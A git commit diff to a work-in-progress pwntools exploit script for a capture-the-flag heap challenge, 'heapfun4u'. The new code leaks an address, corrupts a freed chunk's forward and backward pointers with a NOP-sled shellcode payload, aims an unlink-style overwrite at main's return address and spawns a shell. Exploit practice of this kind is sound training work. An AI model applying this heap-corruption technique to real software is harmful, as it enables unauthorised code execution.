97b8550aac93be35e9240553bd7ef33678363551
t3mp-0xCC <40132263+t3mp-0xCC@users.noreply.github.com>
2022-01-11 23:40:15 +0900

    [WIP] improve heapfun4u solver

--- ctf4u/heapfun4u/exp.py
+++ ctf4u/heapfun4u/exp.py
@@ -7,6 +7,7 @@ from time import sleep
 
 context.terminal = ['tmux', 'sp', '-h']
 context.log_level = "debug"
+#context.log_level = "info"
 
 chall = "./heapfun4u"
 #libc = ELF()
@@ -18,8 +19,10 @@ if len(argv) >= 2 and argv[1] == "r":
     p = remote("example.com", 4444)
 elif len(argv) >= 2 and argv[1] == "d":
 	cmd = """
-        # before menu select
-        b *0x40143a
+        # before write
+        b *0x40082a
+        # after write
+        b *0x400904
 		c
 	"""
 	p = gdb.debug(chall,cmd)
@@ -43,9 +46,10 @@ def free(index):
 def write(index, buffer):
     p.recvuntil("|")
     p.sendline('W')
+    p.recvuntil("Write where:")
     p.sendline(str(index))
     p.recvuntil("Write what:")
-    p.sendline(buffer)
+    p.send(buffer)
     log.info("write: index = {}".format(index))
 
 def niceguy():
@@ -59,26 +63,67 @@ def exit_main():
     p.sendline('E')
 
 
-# heap chunk struct
+# heap chunk struct(freed)
 # +-------------+ 
-# | chunk size  | at last one bit is using for check use or free
+# | chunk size  | # at last one bit is using for check use or free
 # +-------------+
-# |    buffer   |
+# |    buffer   | # buffer - 16 byte
 # +-------------+
-# |   backward  |
+# |   backward  | # 8byte
 # +-------------+
-# |   forward   |
+# |   forward   | # 8byte
 # +-------------+
 
+# get nice address
 leak = niceguy()
 log.info("leak: 0x{:08x}".format(leak))
-main_ret = leak + 0x104
+main_ret = leak + 0x13c
 log.info("main ret: 0x{:08x}".format(main_ret))
-alloc(0x10)# index = 1
-alloc(0x64)# 2
-alloc(0x64)# 3
-free(1)
+
+# alloc && free some chunks
+alloc(0x80)# 1
+alloc(0x50)# 2
+alloc(0x20)# 3
+alloc(0x20)# 4
+alloc(0x20)# 5
+free(2)# write shellcode && unlink
+free(4)# 
+
+# get 1st chunk address && write shellcode
 shellcode = asm(shellcraft.sh())
-write(3, shellcode)
+print(len(shellcode))
+p.sendline('W')
+p.recvuntil("1) ")
+shellcode_chunk = eval(p.recv(14))
+log.info("shellcode chunk: 0x{:08x}".format(shellcode_chunk))
+p.recvuntil("Write where:")
+p.sendline(b'1')
+p.recvuntil("Write what:")
+p.sendline(shellcode)
+
+# get 4th chunk adderss
+p.recvuntil("|")
+p.sendline('W')
+p.recvuntil("4) ")
+four_chunk = eval(p.recv(14))
+log.info("4th chunk: 0x{:08x}".format(four_chunk))
+p.recvuntil("Write where:")
+p.sendline(b'4')
+p.recvuntil("Write what:")
+p.send(b'A')
+
+# overwrite fd & bk @ chunk 2
+payload = p8(0x90) * (0x40 - len(shellcode))# buffer
+payload += shellcode
+payload += p64(shellcode_chunk)# bk
+payload += p64(four_chunk)# fd
+write(2, payload)
+
+# dummy chunk
+payload = p64(main_ret - four_chunk + 0x8)
+#write(4, payload)
+
+alloc(0x50)
+exit_main()
 
 p.interactive()
